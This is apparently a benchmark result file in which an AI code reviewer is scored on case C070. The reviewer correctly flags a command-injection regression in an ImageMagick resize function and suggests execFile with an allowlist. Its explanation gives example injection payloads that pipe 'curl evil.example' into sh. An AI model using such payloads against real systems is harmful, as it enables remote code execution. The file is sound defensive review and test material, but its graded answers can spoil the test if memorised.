@@ -1,0 +1,92 @@
+{
+  "case": "C070",
+  "pr": "C070",
+  "repo": "fixture",
+  "provider": "grok",
+  "api_base": "",
+  "model": "grok-4.5",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "4e469f0c6687",
+  "turns": 3,
+  "tool_calls": null,
+  "seconds": 47.3,
+  "setup_seconds": 0.1,
+  "total_seconds": 47.4,
+  "usage": {
+    "in": 30907,
+    "cache_read": 57344,
+    "cache_write": 0,
+    "out": 2089,
+    "source": "cli"
+  },
+  "cost_usd": 0.0915512,
+  "changed_files": [
+    "src/images/resize.ts"
+  ],
+  "findings": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity": "critical",
+      "body": "`exec()` runs the command through a shell. Interpolating `src` and `filter` into the template lets a caller inject metacharacters and run arbitrary commands (e.g. `filter` = `Lanczos; curl evil.example | sh`, or `src` breaking out of the double quotes).\n\nImageMagick `-filter` values are a fixed set of names and do not need a shell. Keep `execFile`/`spawn` with an argv array and validate `filter` against an allowlist:\n\n```suggestion\n    execFile(\"convert\", [src, \"-filter\", filter, \"-resize\", `${w}x`, \"/tmp/out.png\"], (e) => e ? rej(e) : res(\"/tmp/out.png\"));\n```\n\n(Restore the `execFile` import; reject unknown filter names before invoking convert.)"
+    },
+    {
+      "path": "src/images/resize.ts",
+      "line": 3,
+      "severity": "warning",
+      "body": "`resize(src, w)` becomes `resize(src, filter, w)`. Any existing caller still passing width as the second argument will treat a number as the filter string and shift arguments, producing failed converts or odd shell expansion of `${w}`. If this is intentional API evolution, use an options object or add an overload/wrapper so `(src, w)` keeps working; otherwise document and bump a major version."
+    }
+  ],
+  "summary": "## Verdict\n\n**Do not merge** \u2014 this change introduces remote/local command injection by switching from `execFile` (argv, no shell) to `exec` (shell) and interpolating caller-controlled `src` and `filter` into the command string.\n\n## Analysis\n\n`resize()` previously invoked ImageMagick via `execFile(\"convert\", [src, \"-resize\", ...])`, which never spawns a shell and treats each argument as a literal. The new code builds:\n\n```ts\nexec(`convert \"${src}\" -filter ${filter} -resize ${w}x /tmp/out.png`, ...)\n```\n\nBoth `src` and `filter` are plain `string` parameters with no allowlist or escaping. A filter like `Lanczos; id` or a path like `\" ; curl evil | sh ; \"` runs arbitrary commands with the process privileges. The inline comment states the shell is intentional for \"user-composed filter expressions,\" which is exactly the untrusted-input case that must not go through a shell.\n\nImageMagick filter names are a fixed vocabulary (`Lanczos`, `Mitchell`, `Catrom`, \u2026). They do not require shell metacharacter support. Keep `execFile` / `spawn` with an argv array and validate `filter` against an allowlist (and keep `src` as a single argv element).\n\nAlso note the public signature change (`filter` inserted as the second parameter) will break any existing callers that still pass `(src, w)`.\n\n**Recommendation:** request-changes",
+  "verification": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity_claimed": "critical",
+      "status": "verified",
+      "reason": "The head code uses child_process.exec with unsanitized src and filter interpolated into a shell command string; base used execFile with an argv array. That is a real command-injection regression, and critical severity is appropriate."
+    },
+    {
+      "path": "src/images/resize.ts",
+      "line": 3,
+      "severity_claimed": "warning",
+      "status": "skipped",
+      "reason": "not sampled"
+    }
+  ],
+  "refuted": [],
+  "verifier": {
+    "runs": 1,
+    "seconds": 9.886,
+    "verified": 1,
+    "refuted": 0,
+    "downgraded": 0,
+    "unverified": 0,
+    "skipped": 1,
+    "model": "grok-4.5",
+    "alias": "economy",
+    "endpoint_kind": "xai",
+    "reason": "",
+    "usage": {
+      "in": 2528,
+      "out": 354
+    },
+    "cost_usd": 0.008153
+  },
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C070-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 1,
+    "summary_present": true,
+    "suggestion_blocks": 1,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
